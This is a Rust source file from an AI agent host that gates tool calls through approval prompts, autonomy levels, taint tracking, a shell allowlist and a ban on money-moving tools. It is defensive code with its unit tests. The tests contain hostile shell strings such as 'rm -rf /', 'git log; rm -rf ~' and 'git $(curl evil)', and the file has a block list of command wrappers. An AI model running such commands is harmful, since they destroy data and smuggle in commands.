//! Approval prompts and the persistent allowlist (spec §8.2), and the
//! effect policy that decides when to ask (tooling spec §5.1).

use async_trait::async_trait;
use serde::{Deserialize, Serialize};

use crate::tool::{Effect, ToolPolicy};
use crate::types::ToolCall;

/// What the host does with a call before running it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Check {
    /// Run it.
    Allow,
    /// Ask the user. `always`: an "always" answer may be offered.
    Ask { effect: Effect, always: bool },
    /// Refuse without asking; nothing can approve it.
    Forbid(&'static str),
    /// Refuse without asking: the run's autonomy is `readonly`.
    ReadOnly,
}

/// How much a run may do without asking (tooling spec §5.4), most
/// restrictive first. Set globally (`autonomy`) and per routine, and
/// frozen on the run when it starts. A per-agent ceiling (agent profiles)
/// can later cap it with [`Ord::min`].
#[derive(
    Debug, Clone, Copy, Default, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize,
)]
#[serde(rename_all = "snake_case")]
pub enum Autonomy {
    /// `read` effects only; anything else is refused without asking.
    #[serde(rename = "readonly", alias = "read_only")]
    ReadOnly,
    /// The §5.1 defaults.
    #[default]
    Supervised,
    /// `write` doesn't ask in untainted runs; `destructive` still does.
    Autonomous,
    /// Nothing asks, tainted or not. Forbidden tools stay forbidden.
    Yolo,
}

impl Autonomy {
    pub fn as_str(self) -> &'static str {
        match self {
            Autonomy::ReadOnly => "readonly",
            Autonomy::Supervised => "supervised",
            Autonomy::Autonomous => "autonomous",
            Autonomy::Yolo => "yolo",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "readonly" => Some(Autonomy::ReadOnly),
            "supervised" => Some(Autonomy::Supervised),
            "autonomous" => Some(Autonomy::Autonomous),
            "yolo" => Some(Autonomy::Yolo),
            _ => None,
        }
    }

    /// A run's stored profile: `None` (runs from before T3) or anything
    /// unknown is `supervised`.
    pub fn of_run(stored: Option<&str>) -> Self {
        stored.and_then(Self::parse).unwrap_or_default()
    }
}

impl std::fmt::Display for Autonomy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// The tainted host limit (tooling spec §5.3): in a tainted run, a network
/// read to a host the run hasn't reached asks (`ask`), or doesn't (`allow`,
/// for runs meant to browse). Set in `[taint] egress`, overridden per agent,
/// and frozen on the run when it starts.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Egress {
    #[default]
    Ask,
    Allow,
}

impl Egress {
    pub fn as_str(self) -> &'static str {
        match self {
            Egress::Ask => "ask",
            Egress::Allow => "allow",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "ask" => Some(Egress::Ask),
            "allow" => Some(Egress::Allow),
            _ => None,
        }
    }
}

/// The allowlist pattern of a standing grant for reads from `host` (the
/// tainted host limit). Never matches a call's subject, so it can't grant
/// the tool as a whole.
pub fn host_pattern(host: &str) -> String {
    format!("host:{host}")
}

/// The allowlist pattern of an "always allow this" grant keyed on a
/// [`crate::tool::GrantKey`]. Like [`host_pattern`] it never matches a
/// call's subject, so it can't grant the tool as a whole.
pub fn key_pattern(key: &str) -> String {
    format!("key:{key}")
}

/// What a run brings to [`check`]: its taint and its autonomy profile.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Gate {
    pub tainted: bool,
    pub autonomy: Autonomy,
}

impl Gate {
    /// An untainted, supervised run.
    pub const CLEAN: Gate = Gate {
        tainted: false,
        autonomy: Autonomy::Supervised,
    };
    /// A tainted, supervised run.
    pub const TAINTED: Gate = Gate {
        tainted: true,
        autonomy: Autonomy::Supervised,
    };
}

/// The effect policy, enforced by the host and never by the model:
/// - `read` doesn't ask;
/// - `write` asks unless a grant covers it (`granted`: an "always" entry on
///   the allowlist; or the host's own, [`ToolPolicy::granted`]);
/// - `destructive` asks every time;
/// - `requires_approval` asks for any effect unless an allowlist grant
///   covers it;
/// - `money_movement` / `trade` tools are refused outright;
/// - in a `tainted` run (tooling spec §5.3) every `write` and `destructive`
///   call asks, whatever grants say, and nothing offers "always" (W7),
///   except the [`TAINT_CONTAINED`] tools;
/// - the run's autonomy (§5.4): `readonly` refuses anything but `read`,
///   `autonomous` lets an untainted `write` through unless
///   `requires_approval` forces a prompt, and `yolo` asks nothing.
///
/// `shell` is the exception that defines the allowlist: a command outside
/// it is destructive, one inside it is a granted write.
pub fn check(tool: &str, policy: &ToolPolicy, granted: bool, gate: Gate) -> Check {
    if let Some(flag) = policy.forbidden {
        return Check::Forbid(flag);
    }
    let contained = TAINT_CONTAINED.contains(&tool);
    match gate.autonomy {
        Autonomy::ReadOnly if policy.effect != Effect::Read && !contained => {
            return Check::ReadOnly;
        }
        Autonomy::Yolo => return Check::Allow,
        _ => {}
    }
    let own_grant = granted;
    // No grant covers anything in a tainted run.
    let granted = granted && !gate.tainted;
    let shell = tool == "shell";
    let effect = if shell && granted && policy.effect == Effect::Destructive {
        Effect::Write
    } else {
        policy.effect
    };
    let ask = Check::Ask {
        effect,
        always: effect != Effect::Destructive || shell,
    };
    if gate.tainted {
        let never = Check::Ask {
            effect,
            always: false,
        };
        return match effect {
            _ if contained => check(tool, policy, own_grant, Gate::CLEAN),
            Effect::Read if policy.requires_approval => never,
            Effect::Read => Check::Allow,
            _ => never,
        };
    }
    if gate.autonomy == Autonomy::Autonomous && effect == Effect::Write && !policy.requires_approval
    {
        return Check::Allow;
    }
    match effect {
        Effect::Destructive => ask,
        _ if granted => Check::Allow,
        _ if policy.requires_approval => ask,
        Effect::Read => Check::Allow,
        Effect::Write if policy.granted => Check::Allow,
        Effect::Write => ask,
    }
}

/// Writes that stay inside tern and carry taint along themselves: a
/// tainted run's sub-agents start tainted, and its mail taints whoever reads
/// it. They keep their grants in a tainted run, and a `readonly` run may
/// still use them (its children are `readonly` too).
pub const TAINT_CONTAINED: &[&str] = &[
    "agent_spawn",
    "agent_send",
    "agent_cancel",
    "agent_ask_parent",
    // A tainted run's post is marked tainted, and taints whoever reads it.
    "channel_post",
    // Only a card: the user decides, and it's marked tainted like a post.
    "channel_suggest",
];

/// Why a tainted run asks, for approval prompts.
pub fn taint_note(reason: &str) -> String {
    format!("this run read untrusted content ({reason})")
}

/// Whether a call must go through an approval step at all: some answer
/// other than [`Check::Allow`] is possible before looking at grants.
pub fn needs_check(tool: &str, policy: &ToolPolicy, gate: Gate) -> bool {
    check(tool, policy, false, gate) != Check::Allow
}

/// The message the model gets for a call a `readonly` run may not make.
pub const READONLY_MESSAGE: &str = "blocked: this run is read-only (autonomy = \"readonly\"), so it \
     can't make changes. Say what you would do instead, and the user can do it or run you with more autonomy.";

/// The message the model gets for a forbidden call.
pub fn forbidden_message(flag: &str) -> String {
    format!(
        "blocked: this tool is flagged `{flag}`. tern never runs tools that move money or trade, \
         and nobody can approve them. Tell the user to do this themselves."
    )
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    AllowOnce,
    /// Allow, and remember `pattern` for this tool.
    AlwaysAllow,
    Deny,
    /// Nobody could be asked (no client attached, a chat message that
    /// didn't go out). The agent queues the call in the outbox if it can,
    /// else treats it as a denial.
    Unanswered,
    /// The tainted host limit only ([`ApprovalRequest::egress_host`]):
    /// allow, and don't ask about new hosts again in this run.
    AllowRun,
    /// The tainted host limit only: allow, and grant reads from this host
    /// for good ([`host_pattern`]).
    AlwaysAllowHost,
    /// With [`ApprovalRequest::grant`]: allow, and don't ask again about
    /// this exact thing in this conversation (session). [`Decision::AllowRun`]
    /// is the same for this run, [`Decision::AlwaysAllow`] for good.
    AllowSession,
    /// Not an answer from the user: a scoped answer to an identical request
    /// ([`ApprovalRequest::grant`]) already covers this one. The call runs;
    /// the ledger and transcript say it was covered, not that it was approved.
    CoveredByGrant,
}

/// Journaled output of an `approval` step.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalOutcome {
    Approved,
    Denied,
    Timeout,
    /// Nobody answered in time: the call went to the outbox (tooling spec
    /// §5.2) and the run carried on without it.
    Deferred,
    /// Approved, and no more host-limit prompts in this run ("Allow all
    /// sites for this run"). Journaled, so a replay lifts the limit at the
    /// same step.
    ApprovedForRun,
    /// Approved because the user's scoped answer to an identical request
    /// covered this one ([`Decision::CoveredByGrant`]): they never saw it.
    ApprovedByGrant,
}

impl ApprovalOutcome {
    /// The call may run.
    pub fn runs(self) -> bool {
        matches!(
            self,
            ApprovalOutcome::Approved
                | ApprovalOutcome::ApprovedForRun
                | ApprovalOutcome::ApprovedByGrant
        )
    }
}

#[derive(Debug, Clone)]
pub struct ApprovalRequest {
    /// Unique per request, for front ends that answer asynchronously.
    pub id: String,
    pub run_id: String,
    pub session_id: String,
    pub call: ToolCall,
    /// One-line description of what the call does.
    pub summary: String,
    /// The call's effect, shown with the summary ([`ApprovalRequest::headline`]).
    pub effect: Effect,
    /// What "always allow" would add to the allowlist, or `None` if this
    /// call can't be always-allowed (front ends then hide the option).
    pub pattern: Option<String>,
    /// For a sub-agent's call: its parent run and label, so front ends can
    /// say who is asking.
    pub parent_run_id: Option<String>,
    pub agent_label: Option<String>,
    /// Set when the run is tainted: why ([`taint_note`] says it to the
    /// user). Grants don't cover its writes, and "always" isn't offered.
    pub taint: Option<String>,
    /// Only a front end on the host may answer ([`ToolPolicy::local_approval`]).
    ///
    /// [`ToolPolicy::local_approval`]: crate::tool::ToolPolicy::local_approval
    pub local_only: bool,
    /// Set when this asks only because of the tainted host limit: the new
    /// host. Front ends then also offer "Allow all sites for this run"
    /// ([`Decision::AllowRun`]) and "Always allow <host>"
    /// ([`Decision::AlwaysAllowHost`]).
    pub egress_host: Option<String>,
    /// Set when a `python` script's own tool call asks: one line saying so
    /// ("from a python script (call 7 of this script)"), then the script,
    /// cut to a screenful, for a front end's detail view
    /// ([`ApprovalRequest::script_note`], [`ApprovalRequest::script_text`]).
    pub script: Option<String>,
    /// Set when a scoped grant may be offered: the precise thing it would
    /// cover. Front ends then offer "this run", "this conversation" and
    /// "always" for it ([`Decision::AllowRun`], [`Decision::AllowSession`],
    /// [`Decision::AlwaysAllow`]). Never set in a tainted run or for a
    /// `destructive` call.
    pub grant: Option<GrantOffer>,
    /// A plain-words line for the card: what a grant here does not cover, or
    /// why none is offered ("Not auto-approved: ..."). Shown as the host's
    /// own words, never the agent's.
    pub notice: Option<String>,
}

/// What a scoped grant would cover ([`crate::tool::GrantKey`]).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GrantOffer {
    /// Exact key; also what identical requests are coalesced on.
    pub key: String,
    /// Short name of the target, for grouping and card text.
    pub label: String,
}

impl ApprovalRequest {
    /// "from a python script (call 7 of this script)", for front ends to
    /// show under the headline.
    pub fn script_note(&self) -> Option<&str> {
        self.script.as_deref().and_then(|s| s.lines().next())
    }

    /// The script that made the call, for a detail view.
    pub fn script_text(&self) -> Option<&str> {
        self.script
            .as_deref()
            .and_then(|s| s.split_once('\n'))
            .map(|(_, code)| code)
    }

    /// `write · gmail_send to bob@…`: the effect, then the summary.
    pub fn headline(&self) -> String {
        match self.script_note() {
            Some(note) => format!("{} · {} ({note})", self.effect, self.summary),
            None => format!("{} · {}", self.effect, self.summary),
        }
    }

    /// Why this prompt is stricter than usual: "this run read untrusted
    /// content (…)", for front ends to show under the headline.
    pub fn taint_note(&self) -> Option<String> {
        self.taint.as_deref().map(taint_note)
    }
}

/// One secret a `secret_request` asks for, with what is known about it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecretAsk {
    pub name: String,
    pub in_file: bool,
    /// Set in the environment, which wins over a value saved here.
    pub in_env: bool,
    /// What would read it, e.g. `connector weather (draft) · reaches api.weather.com`.
    pub used_by: Vec<String>,
}

/// The agent asking the user to enter secrets (docs/secret-requests-spec.md).
#[derive(Debug, Clone)]
pub struct SecretRequest {
    pub id: String,
    pub run_id: String,
    pub session_id: String,
    /// The `secret_request` tool call, so front ends can place the prompt
    /// and close it on that call's `tool_finished`.
    pub call_id: Option<String>,
    pub asks: Vec<SecretAsk>,
    /// The agent's words: show them as such, never as tern's own.
    pub reason: String,
    /// The user is asked to replace values that are already set.
    pub replace: bool,
    pub parent_run_id: Option<String>,
    pub agent_label: Option<String>,
}

/// What the user entered, by name. Names left out were skipped. Values go
/// straight to `secrets.toml`; they never reach the model or the journal.
pub type SecretValues = std::collections::BTreeMap<String, String>;

/// One choice on an [`AuthCard::Choose`] card.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AuthOption {
    /// What the answer says: `oauth` or `key`.
    pub id: String,
    /// "Sign in with Notion".
    pub label: String,
    /// One line under it ("No keys to copy").
    #[serde(default)]
    pub detail: String,
    #[serde(default)]
    pub recommended: bool,
}

/// What a sign-in card shows (tooling spec §6.7.3–6.7.4). The options,
/// notes and addresses come from the host (a built-in profile, metadata the
/// host checked, fixed text); only the service's name is the agent's.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum AuthCard {
    /// `auth_propose`: how to connect. The answer is an option's `id` or
    /// `cancel`.
    Choose {
        /// "Connect Notion".
        title: String,
        options: Vec<AuthOption>,
        /// Where the plan came from and how sure tern is ("Found via
        /// auth.notion.com metadata (verified)"), scopes, caveats.
        #[serde(default)]
        notes: Vec<String>,
    },
    /// `connection_add`: the browser leg (`url`, opened on this machine)
    /// or a device code (`user_code` at `verification_uri`). It closes on
    /// its own when the sign-in finishes; the answer is `cancel`, or
    /// `device` to switch to a code.
    SignIn {
        /// "Sign in to Gmail · work".
        title: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        url: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        user_code: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        verification_uri: Option<String>,
        /// A code can be used instead of the browser on this machine.
        #[serde(default)]
        device_available: bool,
        #[serde(default)]
        notes: Vec<String>,
    },
}

/// A sign-in card for the user.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AuthPrompt {
    pub id: String,
    pub run_id: String,
    pub session_id: String,
    /// The tool call, so front ends can place the card and close it on that
    /// call's `tool_finished`. A later card of the same call replaces it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub call_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent_run_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent_label: Option<String>,
    pub card: AuthCard,
}

impl AuthPrompt {
    /// The answers this card accepts.
    pub fn accepts(&self, answer: &str) -> bool {
        answer == "cancel"
            || match &self.card {
                AuthCard::Choose { options, .. } => options.iter().any(|o| o.id == answer),
                AuthCard::SignIn {
                    device_available, ..
                } => answer == "device" && *device_available,
            }
    }
}

#[async_trait]
pub trait ApprovalHandler: Send + Sync {
    async fn ask(&self, req: &ApprovalRequest) -> Decision;

    /// Whether a `write` or `destructive` call nobody answers in time may go
    /// to the outbox, to be approved later. Only the daemon can execute
    /// outbox items, so only its handler says yes.
    fn can_defer(&self) -> bool {
        false
    }

    /// `req` went to the outbox as item `id`: tell the user where they
    /// look (a chat card, an event for clients).
    async fn deferred(&self, _req: &ApprovalRequest, _id: i64) {}

    /// Ask the user to enter secrets. `None` means nobody can be asked
    /// (non-interactive runs), which the tool reports as skipped.
    async fn ask_secrets(&self, _req: &SecretRequest) -> Option<SecretValues> {
        None
    }

    /// Show a sign-in card and wait for the user's answer ([`AuthPrompt::accepts`]).
    /// `None` means nobody can be asked. A sign-in card's asker may stop
    /// waiting (the browser came back), which drops this future.
    async fn ask_auth(&self, _req: &AuthPrompt) -> Option<String> {
        None
    }
}

/// Approves everything (`--yes`).
pub struct AutoApprove;

#[async_trait]
impl ApprovalHandler for AutoApprove {
    async fn ask(&self, _req: &ApprovalRequest) -> Decision {
        Decision::AllowOnce
    }
}

/// Denies everything (non-interactive runs without `--yes`).
pub struct AutoDeny;

#[async_trait]
impl ApprovalHandler for AutoDeny {
    async fn ask(&self, _req: &ApprovalRequest) -> Decision {
        Decision::Deny
    }
}

/// The string allowlist patterns are matched against.
pub fn subject(call: &ToolCall) -> String {
    if call.name == "shell" {
        call.input["command"]
            .as_str()
            .unwrap_or_default()
            .trim()
            .to_owned()
    } else {
        String::new()
    }
}

/// Commands that run other commands, or take flags that do (`sed 1e`,
/// `tar --checkpoint-action=exec`, `rg --pre`): `bash *` or `env *` would
/// approve anything, so they're never offered for "always".
const WRAPPERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "env",
    "sudo",
    "doas",
    "su",
    "xargs",
    "nohup",
    "exec",
    "eval",
    "command",
    "builtin",
    "time",
    "timeout",
    "nice",
    "watch",
    "find",
    "python",
    "python3",
    "node",
    "perl",
    "ruby",
    "php",
    "deno",
    "bun",
    "npx",
    "uvx",
    "ssh",
    "docker",
    "kubectl",
    "sed",
    "awk",
    "gawk",
    "tar",
    "make",
    "cargo",
    "npm",
    "pnpm",
    "yarn",
    "pip",
    "pip3",
    "go",
    "gem",
    "rsync",
    "scp",
    "sftp",
    "vi",
    "vim",
    "nvim",
    "ed",
    "ex",
    "less",
    "more",
    "man",
    "rg",
    "fd",
    "osascript",
    "open",
    "xdg-open",
    "lua",
    "tclsh",
    "rustc",
    "gcc",
    "cc",
    "clang",
    "git",
];

/// Git subcommands that can't run a program. Others can, through `-c` or
/// config, so `git` gets a pattern only for these.
const GIT_READ_ONLY: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "rev-parse",
    "ls-files",
    "blame",
];

/// Pattern "always allow" would record: for `shell`, the first word plus
/// ` *` (or `git <subcommand> *` for read-only git). `None` for commands
/// that wrap others, and for every other tool: a pattern there would cover
/// every path or target the tool can reach.
pub fn pattern_for(call: &ToolCall) -> Option<String> {
    if call.name != "shell" || wants_network(call) {
        return None;
    }
    let subject = subject(call);
    let mut words = subject.split_whitespace();
    let first = words.next()?;
    let base = first
        .trim_start_matches('\\')
        .rsplit('/')
        .next()
        .unwrap_or(first);
    if WRAPPERS.contains(&base) {
        if base == "git" {
            let sub = words.next()?;
            return GIT_READ_ONLY.contains(&sub).then(|| format!("git {sub} *"));
        }
        return None;
    }
    Some(format!("{first} *"))
}

/// A `shell` call asking for network (docs/sandbox-design.md): it asks
/// every time, whatever the allowlist says, and never offers "always".
fn wants_network(call: &ToolCall) -> bool {
    call.name == "shell" && call.input["network"] == true
}

/// Characters that let one shell command run another. A command containing
/// any of these is never auto-approved by a pattern like `git *`.
const SHELL_META: &[char] = &[';', '|', '&', '`', '$', '>', '<', '\n', '(', ')'];

pub fn allowed_by(patterns: &[String], call: &ToolCall) -> bool {
    let subject = subject(call);
    if call.name == "shell" && (subject.contains(SHELL_META) || wants_network(call)) {
        return false;
    }
    patterns.iter().any(|p| {
        glob_match(p, &subject)
            // `git *` also covers bare `git`.
            || p.strip_suffix(" *").is_some_and(|prefix| prefix == subject)
    })
}

/// `*` matches any run of characters; everything else is literal.
pub fn glob_match(pattern: &str, s: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    let [first, middle @ .., last] = parts.as_slice() else {
        return pattern == s;
    };
    let Some(mut rest) = s.strip_prefix(first) else {
        return false;
    };
    for part in middle {
        match rest.find(part) {
            Some(i) => rest = &rest[i + part.len()..],
            None => return false,
        }
    }
    rest.len() >= last.len() && rest.ends_with(last)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn shell(cmd: &str) -> ToolCall {
        ToolCall {
            id: "1".into(),
            name: "shell".into(),
            input: json!({ "command": cmd }),
        }
    }

    #[test]
    fn globbing() {
        assert!(glob_match("git *", "git status"));
        assert!(glob_match("*", ""));
        assert!(glob_match("a*b*c", "axxbyyc"));
        assert!(!glob_match("a*b", "ab c"));
        assert!(!glob_match("ls *", "lsof -i"));
        assert!(glob_match("exact", "exact"));
    }

    #[test]
    fn shell_patterns() {
        assert_eq!(
            pattern_for(&shell("  git status --short")).as_deref(),
            Some("git status *")
        );
        for wrapper in [
            "bash -c 'rm -rf ~'",
            "env X=1 rm -rf /",
            "sudo ls",
            "/usr/bin/env ls",
            "find . -exec rm {} +",
            "\\sh -c id",
            "sed -n '1e id' f",
            "tar --checkpoint=1 --checkpoint-action=exec=id",
            "git -c core.pager=id log",
            "git commit -m x",
            "git",
            "",
        ] {
            assert_eq!(pattern_for(&shell(wrapper)), None, "{wrapper:?}");
        }
        let pats = vec!["git *".to_owned()];
        assert!(allowed_by(&pats, &shell("git log")));
        assert!(allowed_by(&pats, &shell("git")));
        assert!(!allowed_by(&pats, &shell("gitk")));
        assert!(!allowed_by(&pats, &shell("git log; rm -rf ~")));
        let mut push = shell("git push");
        push.input["network"] = true.into();
        assert!(!allowed_by(&pats, &push), "network always asks");
        assert_eq!(pattern_for(&push), None, "and never offers always");
        assert!(!allowed_by(&pats, &shell("git $(curl evil)")));
    }

    fn policy(effect: Effect) -> ToolPolicy {
        ToolPolicy::new(effect, false)
    }

    const ASK_WRITE: Check = Check::Ask {
        effect: Effect::Write,
        always: true,
    };

    #[test]
    fn read_never_asks() {
        assert_eq!(
            check("t", &policy(Effect::Read), false, Gate::CLEAN),
            Check::Allow
        );
        assert!(!needs_check("t", &policy(Effect::Read), Gate::CLEAN));
    }

    #[test]
    fn write_asks_unless_granted() {
        assert_eq!(
            check("t", &policy(Effect::Write), false, Gate::CLEAN),
            ASK_WRITE
        );
        assert_eq!(
            check("t", &policy(Effect::Write), true, Gate::CLEAN),
            Check::Allow
        );
        // The host's own grant (workspace writes, grandfathered connectors).
        let own = ToolPolicy::granted_write(false);
        assert_eq!(check("t", &own, false, Gate::CLEAN), Check::Allow);
        assert!(!needs_check("t", &own, Gate::CLEAN));
    }

    #[test]
    fn destructive_asks_every_time() {
        let p = policy(Effect::Destructive);
        let ask = Check::Ask {
            effect: Effect::Destructive,
            always: false,
        };
        assert_eq!(check("t", &p, false, Gate::CLEAN), ask);
        assert_eq!(
            check("t", &p, true, Gate::CLEAN),
            ask,
            "grants don't cover destructive"
        );
        let p = ToolPolicy { granted: true, ..p };
        assert_eq!(check("t", &p, true, Gate::CLEAN), ask);
    }

    #[test]
    fn requires_approval_forces_a_prompt() {
        let p = policy(Effect::Read).forced(true);
        let ask = Check::Ask {
            effect: Effect::Read,
            always: true,
        };
        assert_eq!(check("t", &p, false, Gate::CLEAN), ask);
        assert_eq!(check("t", &p, true, Gate::CLEAN), Check::Allow);
        let p = ToolPolicy::granted_write(false).forced(true);
        assert_eq!(check("t", &p, false, Gate::CLEAN), ASK_WRITE);
    }

    #[test]
    fn shell_outside_the_allowlist_is_destructive() {
        let p = policy(Effect::Destructive).forced(true);
        assert_eq!(
            check("shell", &p, false, Gate::CLEAN),
            Check::Ask {
                effect: Effect::Destructive,
                always: true
            }
        );
        assert_eq!(check("shell", &p, true, Gate::CLEAN), Check::Allow);
    }

    #[test]
    fn money_movement_is_forbidden_whatever_else() {
        for effect in [Effect::Read, Effect::Write, Effect::Destructive] {
            let p = ToolPolicy {
                forbidden: Some("money_movement"),
                ..ToolPolicy::granted_write(true)
            };
            let p = ToolPolicy { effect, ..p };
            assert_eq!(
                check("t", &p, true, Gate::CLEAN),
                Check::Forbid("money_movement")
            );
            assert!(needs_check("t", &p, Gate::CLEAN));
        }
        assert!(forbidden_message("trade").contains("`trade`"));
    }

    #[test]
    fn grants_never_cover_a_tainted_write() {
        let never = |effect| Check::Ask {
            effect,
            always: false,
        };
        // An "always" entry, the host's own grant, and the shell allowlist.
        assert_eq!(
            check("t", &policy(Effect::Write), true, Gate::TAINTED),
            never(Effect::Write)
        );
        let own = ToolPolicy::granted_write(true);
        assert_eq!(
            check("write_file", &own, false, Gate::TAINTED),
            never(Effect::Write)
        );
        assert!(needs_check("write_file", &own, Gate::TAINTED));
        let shell = policy(Effect::Destructive).forced(true);
        assert_eq!(
            check("shell", &shell, true, Gate::TAINTED),
            never(Effect::Destructive)
        );
        assert_eq!(
            check("t", &policy(Effect::Destructive), true, Gate::TAINTED),
            never(Effect::Destructive)
        );
        // Reads don't ask, coordinating sub-agents keeps its grant, and
        // forbidden stays forbidden.
        assert_eq!(
            check("t", &policy(Effect::Read), false, Gate::TAINTED),
            Check::Allow
        );
        assert!(!needs_check("agent_spawn", &own, Gate::TAINTED));
        let money = ToolPolicy {
            forbidden: Some("trade"),
            ..own
        };
        assert_eq!(
            check("t", &money, true, Gate::TAINTED),
            Check::Forbid("trade")
        );
        assert!(taint_note("http_fetch").contains("untrusted content"));
    }

    #[test]
    fn autonomy_profiles_decide_what_asks() {
        let gate = |autonomy, tainted| Gate { tainted, autonomy };
        let write = policy(Effect::Write);
        let wipe = policy(Effect::Destructive);
        let ask = |effect, always| Check::Ask { effect, always };
        // readonly: only reads; tern's own coordination still works.
        let ro = gate(Autonomy::ReadOnly, false);
        assert_eq!(check("t", &policy(Effect::Read), false, ro), Check::Allow);
        assert_eq!(check("t", &write, true, ro), Check::ReadOnly);
        assert_eq!(
            check("t", &ToolPolicy::granted_write(true), false, ro),
            Check::ReadOnly
        );
        assert_eq!(check("t", &wipe, false, ro), Check::ReadOnly);
        assert_eq!(
            check("agent_spawn", &ToolPolicy::granted_write(true), false, ro),
            Check::Allow
        );
        // autonomous: untainted writes go through, unless forced; the rest
        // is supervised.
        let auto = gate(Autonomy::Autonomous, false);
        assert_eq!(check("t", &write, false, auto), Check::Allow);
        assert_eq!(
            check("t", &write.forced(true), false, auto),
            ask(Effect::Write, true)
        );
        assert_eq!(
            check("t", &wipe, false, auto),
            ask(Effect::Destructive, false)
        );
        assert_eq!(
            check("t", &write, false, gate(Autonomy::Autonomous, true)),
            ask(Effect::Write, false),
            "taint wins over autonomous"
        );
        // yolo: nothing asks, tainted or not; forbidden stays forbidden.
        let yolo = gate(Autonomy::Yolo, true);
        assert_eq!(check("t", &wipe, false, yolo), Check::Allow);
        assert_eq!(
            check("shell", &wipe.forced(true), false, yolo),
            Check::Allow
        );
        let money = ToolPolicy {
            forbidden: Some("money_movement"),
            ..write
        };
        assert_eq!(
            check("t", &money, false, yolo),
            Check::Forbid("money_movement")
        );
        // A tainted run's forced read (http_fetch to a new host) asks
        // without "always", and old grants don't cover it.
        assert_eq!(
            check("t", &policy(Effect::Read).forced(true), true, Gate::TAINTED),
            ask(Effect::Read, false)
        );
        assert!(Autonomy::ReadOnly < Autonomy::Supervised && Autonomy::Autonomous < Autonomy::Yolo);
        assert_eq!(Autonomy::of_run(None), Autonomy::Supervised);
        assert_eq!(Autonomy::of_run(Some("yolo")), Autonomy::Yolo);
        assert_eq!(Autonomy::parse("readonly"), Some(Autonomy::ReadOnly));
    }

    #[test]
    fn non_shell_tools_are_never_offered_always() {
        let call = ToolCall {
            id: "1".into(),
            name: "write_file".into(),
            input: json!({}),
        };
        assert_eq!(pattern_for(&call), None);
        assert!(!allowed_by(&[], &call));
    }
}
